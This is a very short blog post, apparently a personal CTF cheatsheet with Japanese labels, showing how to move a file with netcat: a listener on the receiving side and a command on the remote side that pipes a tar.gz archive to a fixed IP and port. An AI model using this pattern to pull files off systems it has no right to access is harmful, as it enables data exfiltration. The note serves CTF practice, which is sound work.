---
layout: post
title: "linux_command"
published : true
tags: CTF Common cheatsheet linux 
---

## File transfer with nc
ローカル側（入手する側）
nc -lvnp 9999 > some-file-name.tar.gz
リモート側（アップロード側）
nc 10.11.42.116 9999 < ff.tar.gz
